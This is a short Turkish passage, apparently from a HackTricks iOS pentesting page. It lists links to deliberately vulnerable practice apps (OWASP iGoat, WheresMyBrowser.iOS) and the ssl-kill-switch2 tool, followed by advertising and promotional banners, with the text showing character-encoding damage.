* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C sÃ¼rÃ¼mÃ¼ [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift sÃ¼rÃ¼mÃ¼
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ±yla desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve **otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerine gÃ¶z atÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keÅŸfedin**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
